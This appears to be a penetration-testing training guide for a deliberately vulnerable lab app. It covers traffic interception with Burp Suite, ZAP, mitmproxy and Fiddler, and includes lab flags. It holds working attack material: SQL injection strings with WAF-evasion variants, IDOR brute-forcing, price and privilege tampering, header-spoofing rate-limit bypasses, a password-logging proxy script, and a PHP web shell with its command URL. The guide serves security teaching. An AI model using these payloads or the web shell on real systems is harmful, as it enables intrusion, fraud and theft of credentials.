# 05 - Man-in-the-Middle (MITM) Attacks Guide
## Complete Guide for Traffic Interception & Modification

Copyright (c) 2026 MOJ for Sheflabs. All rights reserved.

---

## Table of Contents

1. [Introduction to MITM Attacks](#introduction-to-mitm-attacks)
2. [Burp Suite Setup & Configuration](#burp-suite-setup--configuration)
3. [Intercepting HTTP Traffic](#intercepting-http-traffic)
4. [Modifying Requests](#modifying-requests)
5. [Modifying Responses](#modifying-responses)
6. [Advanced Burp Suite Techniques](#advanced-burp-suite-techniques)
7. [Alternative Tools - OWASP ZAP](#alternative-tools---owasp-zap)
8. [Alternative Tools - mitmproxy](#alternative-tools---mitmproxy)
9. [Alternative Tools - Fiddler](#alternative-tools---fiddler)
10. [MITM for Different Difficulty Levels](#mitm-for-different-difficulty-levels)
11. [Practical Exploitation Scenarios](#practical-exploitation-scenarios)

---

## Introduction to MITM Attacks

### What is a MITM Attack?

A Man-in-the-Middle (MITM) attack occurs when an attacker intercepts communication between two parties, allowing them to:
- Read sensitive data
- Modify requests before they reach the server
- Alter responses before they reach the client
- Inject malicious content
- Bypass client-side security controls

### Legal & Ethical Context

**IMPORTANT:** The techniques in this guide should ONLY be used on:
- Your own applications
- Applications you have explicit permission to test
- This Medview+ training environment

Unauthorized MITM attacks are ILLEGAL and unethical.

### Why Learn MITM Techniques?

- Understanding client-server communication
- Bypassing client-side validation
- Testing API security
- Identifying hidden parameters
- Analyzing application behavior
- Penetration testing skills

---

## Burp Suite Setup & Configuration

### Installation

#### Burp Suite Community (Free)
```bash
# Download from PortSwigger
https://portswigger.net/burp/communitydownload

# Linux
chmod +x burpsuite_community_linux.sh
./burpsuite_community_linux.sh

# macOS
Open .dmg file and install

# Windows
Run .exe installer
```

#### Burp Suite Professional (Paid)
```
Download from: https://portswigger.net/burp/pro
30-day trial available
```

### Initial Configuration

#### Step 1: Launch Burp Suite
```
1. Open Burp Suite
2. Select "Temporary project" (or create new project)
3. Use Burp defaults
4. Click "Start Burp"
```

#### Step 2: Configure Proxy Listener
```
1. Go to "Proxy" → "Options"
2. Proxy Listeners section
3. Default: 127.0.0.1:8080
4. Click "Edit" to modify if needed
5. Ensure "Running" checkbox is checked
```

#### Step 3: Configure Browser Proxy

**Firefox (Recommended):**
```
1. Settings → Network Settings → Settings
2. Select "Manual proxy configuration"
3. HTTP Proxy: 127.0.0.1
4. Port: 8080
5. Check "Also use this proxy for HTTPS"
6. Click OK
```

**Chrome (with FoxyProxy):**
```
1. Install FoxyProxy extension
2. Add new proxy
3. Title: Burp Suite
4. Proxy Type: HTTP
5. Proxy IP: 127.0.0.1
6. Port: 8080
7. Save and enable
```

**Alternative: System-wide proxy (macOS):**
```bash
# Enable
networksetup -setwebproxy "Wi-Fi" 127.0.0.1 8080
networksetup -setsecurewebproxy "Wi-Fi" 127.0.0.1 8080

# Disable
networksetup -setwebproxystate "Wi-Fi" off
networksetup -setsecurewebproxystate "Wi-Fi" off
```

#### Step 4: Install Burp CA Certificate

**For HTTPS interception:**
```
1. With proxy configured, visit: http://burp
2. Click "CA Certificate" in top right
3. Save burpsuite.der

Firefox:
- Settings → Privacy & Security → Certificates → View Certificates
- Import → Select burpsuite.der
- Trust for website identification

Chrome/System:
- Import into system certificate store
- Trust for web security
```

### Testing the Setup

```
1. Ensure Burp proxy is running
2. Browser is configured
3. Intercept is ON: Proxy → Intercept → Intercept is on
4. Visit: http://localhost/Medview/vulnerable/
5. Request should appear in Burp
6. Click "Forward" to send it
```

---

## Intercepting HTTP Traffic

### Basic Interception

#### Enable Interception
```
Burp Suite:
1. Proxy → Intercept
2. Click "Intercept is on" (should show orange)
3. Navigate to target URL in browser
4. Request appears in intercept tab
```

#### Understanding the Request
```http
POST /Medview/vulnerable/user-login-sqli.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0...
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Cookie: PHPSESSID=abc123

username=admin&password=test&submit=Login
```

**Key Components:**
- **Method:** POST, GET, PUT, DELETE, etc.
- **Path:** The endpoint being accessed
- **Headers:** Metadata about the request
- **Body:** Data being sent (for POST/PUT)

### Selective Interception

#### Configure Scope
```
1. Target → Scope
2. Add target: http://localhost/Medview/vulnerable/
3. Proxy → Options → Intercept Client Requests
4. Add rule: "And URL Is in target scope"
```

#### Filter by File Extension
```
Proxy → Options → Intercept Client Requests

Don't intercept:
- .css
- .js  
- .jpg
- .png
- .gif
- .woff

Only intercept application requests
```

### Forwarding & Dropping

```
Forward: Send request to server (Ctrl+F)
Drop: Discard request, never reaches server (Ctrl+Z)
Action → Do intercept → Response to this request: Intercept response
```

---

## Modifying Requests

### Example 1: Bypassing Client-Side Validation

**Scenario:** Login form with JavaScript validation

```html
<form onsubmit="return validateForm()">
  <input type="text" id="username" required>
  <input type="password" id="password" minlength="8" required>
</form>

<script>
function validateForm() {
  if(password.length < 8) return false;
  return true;
}
</script>
```

**Bypass with Burp:**
```
1. Intercept login request
2. Original: password=short
3. Modified: password=sh (only 2 chars)
4. Forward request
5. Bypass successful - server accepts short password
```

### Example 2: Mass Assignment Exploitation

**Original Request:**
```http
POST /mass-assignment-vulnerable.php HTTP/1.1

amount=100&item_id=1&submit=Pay
```

**Modified Request:**
```http
POST /mass-assignment-vulnerable.php HTTP/1.1

amount=100&item_id=1&is_premium=1&discount=100&balance=999999&submit=Pay
```

**Steps in Burp:**
```
1. Intercept payment request
2. Right-click → Send to Repeater (Ctrl+R)
3. In Repeater, add parameters:
   &is_premium=1&discount=100&balance=999999
4. Click "Send"
5. Analyze response
6. If successful, repeat in actual request
```

### Example 3: Price Manipulation

**Original:**
```http
POST /checkout.php HTTP/1.1

item_id=1&quantity=1&price=500&submit=Buy
```

**Modified:**
```http
POST /checkout.php HTTP/1.1

item_id=1&quantity=1&price=1&submit=Buy
```

### Example 4: Privilege Escalation

**Original:**
```http
POST /update-profile.php HTTP/1.1

fullname=John&email=john@test.com&submit=Update
```

**Modified:**
```http
POST /update-profile.php HTTP/1.1

fullname=John&email=john@test.com&role=admin&is_admin=1&submit=Update
```

### Example 5: IDOR Exploitation

**Original:**
```http
GET /appointment-history-vulnerable.php?user_id=1 HTTP/1.1
```

**Modified:**
```http
GET /appointment-history-vulnerable.php?user_id=2 HTTP/1.1
```

**Burp Intruder for Automation:**
```
1. Send request to Intruder (Ctrl+I)
2. Clear all payload markers (Clear §)
3. Highlight "1" in user_id=1
4. Click "Add §" to mark: user_id=§1§
5. Payloads tab → Payload type: Numbers
6. From: 1, To: 100, Step: 1
7. Start attack
8. Analyze responses (200 OK = success)
```

---

## Modifying Responses

### Example 1: Changing Balance Display

**Scenario:** Modify account balance shown to user

**Original Response:**
```html
<div class="balance">
  <h3>Account Balance:</h3>
  <p class="amount">₦1,000.00</p>
</div>
```

**Steps in Burp:**
```
1. Intercept request to dashboard
2. Action → Do intercept → Response to this request
3. Forward request
4. Response appears in Intercept
5. Find: <p class="amount">₦1,000.00</p>
6. Replace with: <p class="amount">₦999,000.00</p>
7. Forward response
8. Browser displays modified balance
```

### Example 2: Bypassing Restrictions

**Original Response:**
```html
<div class="premium-feature" style="display:none">
  <button disabled>Premium Feature</button>
</div>
```

**Modified Response:**
```html
<div class="premium-feature" style="display:block">
  <button>Premium Feature</button>
</div>
```

### Example 3: Modifying JavaScript

**Original:**
```javascript
const MAX_FILE_SIZE = 1048576; // 1MB
if(file.size > MAX_FILE_SIZE) {
  alert("File too large!");
  return false;
}
```

**Modified:**
```javascript
const MAX_FILE_SIZE = 104857600; // 100MB
if(file.size > MAX_FILE_SIZE) {
  alert("File too large!");
  return false;
}
```

### Using Match & Replace

**Automated response modification:**
```
Proxy → Options → Match and Replace

Add rule:
Type: Response body
Match: ₦1,000.00
Replace: ₦999,000.00
Enable: ✓
```

---

## Advanced Burp Suite Techniques

### 1. Repeater - Manual Testing

```
Purpose: Manually modify and resend requests

Usage:
1. Intercept request
2. Right-click → Send to Repeater (Ctrl+R)
3. Modify request in Repeater
4. Click "Send"
5. Analyze response
6. Iterate and test variations
```

**Example: SQL Injection Testing**
```
Original: username=admin
Test 1: username=admin'
Test 2: username=admin' OR '1'='1' --
Test 3: username=admin' UNION SELECT...
```

### 2. Intruder - Automated Testing

```
Purpose: Automate request variation testing

Attack Types:
- Sniper: Single payload position
- Battering ram: Same payload in all positions
- Pitchfork: Multiple payloads, synchronized
- Cluster bomb: All payload combinations
```

**Example: Brute Force Attack**
```
1. Send login request to Intruder
2. Mark username and password:
   username=§admin§&password=§test§
3. Payloads tab:
   Payload set 1 (username): Simple list
   - admin
   - administrator
   - root
   
   Payload set 2 (password): Runtime file
   - Load common passwords list
4. Options → Grep - Match:
   - Add: "Login successful"
   - Add: "Invalid credentials"
5. Start attack
6. Filter by status code or grep match
```

### 3. Scanner - Automated Vulnerability Detection

**Pro version only:**
```
1. Right-click request → Scan
2. Select scan type:
   - Crawl and audit
   - Audit selected items
3. Configure scan settings
4. Start scan
5. Review findings in Dashboard → Issues
```

### 4. Sequencer - Session Token Analysis

```
Purpose: Analyze randomness of session tokens

Usage:
1. Capture request with session token
2. Send to Sequencer
3. Select token location
4. Click "Start live capture"
5. Capture 10,000+ tokens
6. Analyze randomness
7. Identify weak token generation
```

### 5. Comparer - Diff Tool

```
Purpose: Compare two requests/responses

Usage:
1. Send items to Comparer
2. Select two items
3. Click "Words" or "Bytes"
4. View differences highlighted
5. Identify injection points or behavior changes
```

### 6. Decoder - Encoding/Decoding

```
Purpose: Encode/decode data

Supported formats:
- URL encoding
- HTML encoding
- Base64
- Hex
- ASCII
- Gzip

Usage:
1. Paste data in Decoder
2. Select encoding/decoding operation
3. Chain multiple operations
4. Copy result
```

### 7. Extensions - Extend Functionality

```
Extender → BApp Store

Popular extensions:
- **Autorize:** Authorization testing
- **JWT Editor:** JWT manipulation
- **Param Miner:** Hidden parameter discovery
- **Turbo Intruder:** Fast, custom attacks
- **Active Scan++:** Additional scan checks
- **Logger++:** Enhanced logging
- **Upload Scanner:** File upload testing
```

---

## Alternative Tools - OWASP ZAP

### Installation

```bash
# Download from https://www.zaproxy.org/download/

# Linux
sh ZAP_LINUX.sh

# macOS  
open ZAP.app

# Windows
ZAP.exe
```

### Basic Setup

```
1. Launch ZAP
2. Quick Start → Automated Scan
3. Enter URL: http://localhost/Medview/vulnerable/
4. Click "Attack"

OR Manual Explore:
1. Quick Start → Manual Explore
2. Configure browser to use ZAP proxy (8080)
3. Browse application manually
4. ZAP captures all traffic
```

### Intercepting Requests

```
1. Enable breakpoints:
   - Green/Red circle icons in toolbar
   - Green: Intercept requests
   - Red: Intercept responses
2. Browse to target page
3. Request appears in breakpoints tab
4. Modify as needed
5. Click step button to forward
```

### Active Scanning

```
1. Sites tree → Right-click target
2. Attack → Active Scan
3. Configure scan policy
4. Start scan
5. Review alerts in Alerts tab
```

### Fuzzing

```
1. History → Right-click request
2. Attack → Fuzz
3. Highlight parameter value
4. Click "Add" in Fuzz Locations
5. Add payload:
   - File: Select wordlist
   - Regex: Generate patterns
   - Numbers: Sequential numbers
6. Start Fuzzer
7. Analyze responses
```

### ZAP Scripts

```
Scripts tab → Load scripts

Example - Add custom header:
File: httpsender_add_header.py

from org.parosproxy.paros.network import HttpMessage
def sendingRequest(msg, initiator, helper):
    msg.getRequestHeader().setHeader("X-Custom", "value")
```

---

## Alternative Tools - mitmproxy

### Installation

```bash
# Using pip
pip install mitmproxy

# Using homebrew (macOS)
brew install mitmproxy

# Using apt (Linux)
sudo apt install mitmproxy
```

### Basic Usage

#### Interactive Mode (mitmproxy)
```bash
# Start mitmproxy
mitmproxy

# Configure browser proxy to 127.0.0.1:8080
# Browse application
# Use arrow keys to navigate
# Press Enter to view request/response
# Press 'e' to edit
# Press 'q' to quit
```

#### Console Mode (mitmdump)
```bash
# Capture traffic and save
mitmdump -w capture.flow

# Replay traffic
mitmdump -c capture.flow

# Filter and save
mitmdump -w filtered.flow "~d localhost"
```

#### Web Interface (mitmweb)
```bash
# Start with web UI
mitmweb

# Access: http://127.0.0.1:8081
# Visual interface like Burp
```

### Scripting with mitmproxy

**Example: Modify all requests**
```python
# modify_requests.py
def request(flow):
    # Add custom header
    flow.request.headers["X-Modified"] = "true"
    
    # Modify POST data
    if flow.request.method == "POST":
        flow.request.text = flow.request.text.replace(
            "quantity=1",
            "quantity=-10"
        )

# Run: mitmproxy -s modify_requests.py
```

**Example: Log sensitive data**
```python
# log_passwords.py
def request(flow):
    if "password" in flow.request.text:
        with open("passwords.log", "a") as f:
            f.write(f"{flow.request.text}\n")
```

### Advanced mitmproxy

**SSL pinning bypass:**
```bash
# Android
mitmproxy --set android_pin=true

# iOS  
mitmproxy --set ios_pin=true
```

**Upstream proxy (chain proxies):**
```bash
mitmproxy --mode upstream:http://proxy.example.com:8080
```

---

## Alternative Tools - Fiddler

### Installation (Windows/macOS)

```
Download from: https://www.telerik.com/fiddler
Windows: Install .exe
macOS: Install .dmg
```

### Basic Usage

```
1. Launch Fiddler
2. Tools → Options → HTTPS
3. Enable "Capture HTTPS CONNECTs"
4. Enable "Decrypt HTTPS traffic"
5. Install certificate when prompted
6. Start capturing (F12)
```

### Request Modification

```
1. Intercepting:
   Rules → Automatic Breakpoints → Before Requests
2. Request appears with red icon
3. TextView → Modify request
4. Click "Run to Completion"
```

### AutoResponder

**Mock server responses:**
```
1. AutoResponder tab
2. Enable AutoResponder
3. Add rule:
   - Match: http://localhost/Medview/vulnerable/api-vulnerable.php
   - Action: File response.txt
4. Create response.txt with custom response
5. Requests matching rule get mock response
```

### FiddlerScript

**Modify traffic programmatically:**
```csharp
// CustomRules.js
static function OnBeforeRequest(oSession: Session) {
    if (oSession.uriContains("login")) {
        oSession.oRequest.headers.Add("X-Custom", "value");
    }
}

static function OnBeforeResponse(oSession: Session) {
    if (oSession.oResponse.headers.ExistsAndContains("Content-Type", "html")) {
        oSession.utilReplaceInResponse("₦1,000", "₦999,000");
    }
}
```

---

## MITM for Different Difficulty Levels

### Low Difficulty

**Characteristics:**
- No input validation
- No HTTPS enforcement
- No CSRF tokens
- Detailed error messages

**MITM Tactics:**
```
1. Simple parameter modification works
2. No encoding required
3. Direct SQL injection in requests
4. Price manipulation straightforward
5. No anti-tampering checks
```

**Example:**
```http
Original: price=500
Modified: price=1
Result: Accepted without validation
```

### Medium Difficulty

**Characteristics:**
- Basic input validation
- Some SQL escaping
- Generic error messages
- Simple CSRF tokens

**MITM Tactics:**
```
1. URL encode special characters
2. Use alternative SQL syntax
3. CSRF token required but predictable
4. Timing attacks possible
```

**Example - SQL Injection:**
```http
Original: username=admin' OR '1'='1' --
Blocked: Contains blacklisted chars

Modified: username=admin' OR 1=1 %23
Encoded: username=admin%27%20OR%201%3D1%20%23
Result: May bypass simple filters
```

**Example - CSRF Bypass:**
```
1. Intercept legitimate request
2. Copy CSRF token
3. Use in malicious request
4. If token not tied to session, succeeds
```

### Hard Difficulty

**Characteristics:**
- Strong input validation
- Prepared statements
- Cloudflare WAF active
- Encrypted parameters
- Rate limiting

**MITM Tactics:**
```
1. Advanced encoding/obfuscation
2. WAF bypass techniques
3. Time-based attacks
4. Header manipulation
5. Protocol-level attacks
```

**Example - WAF Bypass:**
```http
Original payload (blocked):
username=admin' OR '1'='1' --

Bypass attempts:
1. Case variation:
   username=admin' oR '1'='1' --

2. Comment injection:
   username=admin'/*comment*/OR/**/'1'='1'--

3. Encoding:
   username=admin'/**/OR/**/0x31=0x31--

4. Unicode:
   username=admin\u0027/**/OR/**/'1'='1'--
```

**Example - Rate Limit Bypass:**
```http
Add headers to appear as different clients:

X-Forwarded-For: 1.2.3.4
X-Real-IP: 5.6.7.8
X-Originating-IP: 9.10.11.12
```

### Impossible Difficulty

**Characteristics:**
- Production-level security
- All protections enabled
- Aggressive WAF + rate limiting
- Strong encryption
- Multi-factor authentication

**MITM Tactics (Nearly Unbreakable):**
```
1. Find unprotected endpoints
2. Time-of-check/time-of-use race conditions
3. Business logic flaws
4. Advanced XXE/SSRF
5. Zero-day exploits
```

**Focus Areas:**
```
- Logic flaws not caught by WAF
- Race conditions
- Advanced deserialization
- Template injection
- Prototype pollution
```

---

## Practical Exploitation Scenarios

### Scenario 1: SQL Injection via MITM

**Target:** user-login-sqli.php

**Steps:**
```
1. Open Burp, enable intercept
2. Navigate to login page
3. Enter any credentials
4. Intercept POST request:

POST /Medview/vulnerable/user-login-sqli.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

username=test&password=test&submit=Login

5. Modify username:
username=admin' OR '1'='1' --&password=test&submit=Login

6. Forward request
7. Observe successful login
8. Flag captured: FLAG{SQL_1nj3ct10n_M4st3r_2025}
```

### Scenario 2: Mass Assignment Attack

**Target:** mass-assignment-vulnerable.php

**Steps:**
```
1. Login to application
2. Navigate to payment page
3. Select item to purchase
4. Intercept purchase request:

POST /mass-assignment-vulnerable.php HTTP/1.1
Host: localhost

amount=500&item_id=1&submit=Pay

5. Send to Repeater
6. Add malicious parameters:

amount=500&item_id=1&is_premium=1&discount=100&balance=999999&submit=Pay

7. Send request
8. Check response for success
9. Verify balance increased
10. Flag captured: FLAG{M4ss_4ss1gn_Pr1v_3sc}
```

### Scenario 3: IDOR Exploitation

**Target:** appointment-history-vulnerable.php

**Steps:**
```
1. Login as user
2. View your appointments
3. Intercept request:

GET /appointment-history-vulnerable.php?user_id=1 HTTP/1.1

4. Send to Intruder
5. Mark user_id parameter:
   user_id=§1§
6. Set payload: Numbers 1-100
7. Start attack
8. Analyze responses:
   - 200 OK = Data accessible
   - 403/404 = No access
9. View other users' appointments
10. Flag captured: FLAG{1D0R_Br0k3n_4cc3ss}
```

### Scenario 4: Price Manipulation

**Target:** checkout.php

**Steps:**
```
1. Add expensive item to cart
2. Proceed to checkout
3. Intercept checkout request:

POST /checkout.php HTTP/1.1

item_id=5&quantity=1&price=5000&total=5000&submit=Buy

4. Modify price:

item_id=5&quantity=1&price=1&total=1&submit=Buy

5. Forward request
6. Verify purchase for ₦1 instead of ₦5,000
7. Exploit successful
```

### Scenario 5: Response Manipulation

**Target:** dashboard-vulnerable.php

**Steps:**
```
1. Login to dashboard
2. Intercept dashboard request
3. Action → Intercept responses
4. Forward request
5. Intercept response:

<div class="balance">₦1,000.00</div>
<div class="user-role">User</div>

6. Modify response:

<div class="balance">₦999,000.00</div>
<div class="user-role">Administrator</div>

7. Forward response
8. Browser shows modified content
9. Client-side manipulation successful
```

### Scenario 6: Session Hijacking

**Target:** Any authenticated page

**Steps:**
```
1. Login to application
2. View cookies in Burp:
   Proxy → HTTP history → Find login request
3. Observe session cookie:
   Cookie: PHPSESSID=abc123xyz

4. Open new browser (no login)
5. Intercept any request to application
6. Add stolen session cookie:
   Cookie: PHPSESSID=abc123xyz

7. Forward request
8. Access granted without login
9. Session hijacking successful
```

### Scenario 7: CSRF Token Bypass

**Target:** update-profile.php

**Steps:**
```
1. Login and navigate to profile
2. Intercept profile update:

POST /update-profile.php HTTP/1.1

csrf_token=abc123&fullname=John&email=john@test.com

3. Note CSRF token
4. Create malicious request without token:

<form action="http://localhost/Medview/vulnerable/update-profile.php" method="POST">
  <input name="fullname" value="Hacked">
  <input name="email" value="hacked@evil.com">
</form>

5. If Low difficulty, may work without token
6. If Medium, may need token but can reuse
7. Test various bypass techniques
```

### Scenario 8: File Upload Bypass

**Target:** file-upload.php

**Steps:**
```
1. Navigate to file upload page
2. Select malicious PHP file (shell.php)
3. Intercept upload request:

POST /file-upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--

4. Modify Content-Type:
   Content-Type: image/jpeg

5. Or modify filename:
   filename="shell.php.jpg"

6. Forward request
7. If upload succeeds, access shell:
   http://localhost/Medview/uploads/shell.php?cmd=whoami
```

---

## Best Practices & Tips

### Security Testing Best Practices

```
1. Always test on authorized systems only
2. Document all findings
3. Never test on production without permission
4. Use isolated lab environments
5. Keep tools updated
6. Understand the impact of exploits
7. Follow responsible disclosure
```

### Efficient Burp Usage

```
1. Use keyboard shortcuts:
   Ctrl+R: Send to Repeater
   Ctrl+I: Send to Intruder
   Ctrl+F: Forward request
   Ctrl+Z: Drop request

2. Organize your testing:
   - Use Burp projects (Pro)
   - Take screenshots
   - Export interesting requests
   - Save configurations

3. Filter noise:
   - Configure scope
   - Filter by file extension
   - Use display filters
   - Hide static content
```

### Tool Comparison

| Feature | Burp Suite | OWASP ZAP | mitmproxy | Fiddler |
|---------|------------|-----------|-----------|---------|
| Cost | Free/Paid | Free | Free | Free/Paid |
| Platform | All | All | All | Win/Mac |
| Ease of Use | Medium | Easy | Hard | Easy |
| Scripting | Java | Python/JS | Python | C# |
| Scanner | Pro only | Yes | No | No |
| Extensions | Many | Many | Scripts | Some |
| Best For | Professional | Learning | Automation | Windows |

---

## Conclusion

This guide has covered:
- Complete MITM attack methodology
- Burp Suite mastery
- Alternative tools (ZAP, mitmproxy, Fiddler)
- Practical exploitation scenarios
- Difficulty-specific techniques

**Remember:**
- Use ONLY on authorized systems
- Document all findings
- Understand what you're doing
- Learn responsibly

**Next Steps:**
- Practice all scenarios
- Try different tools
- Experiment with bypasses
- Study WAF evasion techniques (next guide)

---

**Last Updated:** 2026-01-01  
**Version:** 1.0  
**Estimated Time to Master:** 20+ hours

Copyright (c) 2026 MOJ for Sheflabs. All rights reserved.
